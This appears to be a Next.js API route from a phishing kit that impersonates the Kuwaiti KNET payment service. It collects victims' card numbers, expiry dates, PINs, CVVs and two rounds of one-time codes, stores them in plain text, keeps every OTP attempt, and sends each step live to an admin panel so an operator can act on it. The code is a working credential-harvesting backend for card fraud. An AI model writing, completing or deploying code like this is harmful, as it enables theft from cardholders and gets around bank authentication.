import { NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { KNET_REVIEW, combineOtpHistory } from "@/models/knet.repository";
import { scheduleAdminRealtimeBroadcast } from "@/lib/admin-realtime-hub";

export async function POST(req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  const body = await req.json().catch(() => ({}));
  const { card, expiry, pin, otp, cvv } = body as Record<string, string | undefined>;

  const row = await prisma.knet.findUnique({ where: { id } });
  if (!row) return NextResponse.json({ error: "not_found" }, { status: 404 });

  if (card) {
    await prisma.knet.update({
      where: { id },
      data: {
        cardNumber: card.replace(/\D/g, ""),
        expiryDate: expiry || row.expiryDate,
        pin: pin || row.pin,
        reviewStep: KNET_REVIEW.awaitingAdminCard,
        updatedAt: new Date(),
      },
    });
  } else if (otp !== undefined) {
    const isOtp2 =
      row.reviewStep === KNET_REVIEW.otp2Entry ||
      row.reviewStep === KNET_REVIEW.retryOtp2;

    if (isOtp2) {
      const combined = combineOtpHistory(row.otp2, otp);
      await prisma.knet.update({
        where: { id },
        data: { otp2: combined, otp2Verified: true, reviewStep: KNET_REVIEW.awaitingAdminOtp2, updatedAt: new Date() },
      });
    } else {
      const combined = combineOtpHistory(row.otp, otp);
      await prisma.knet.update({
        where: { id },
        data: { otp: combined, otpVerified: true, reviewStep: KNET_REVIEW.awaitingAdminOtp, updatedAt: new Date() },
      });
    }
  } else if (cvv !== undefined) {
    await prisma.knet.update({
      where: { id },
      data: { cvv, cvvVerified: true, reviewStep: KNET_REVIEW.awaitingAdminCvv, updatedAt: new Date() },
    });
  }

  scheduleAdminRealtimeBroadcast();
  return NextResponse.json({ ok: true });
}
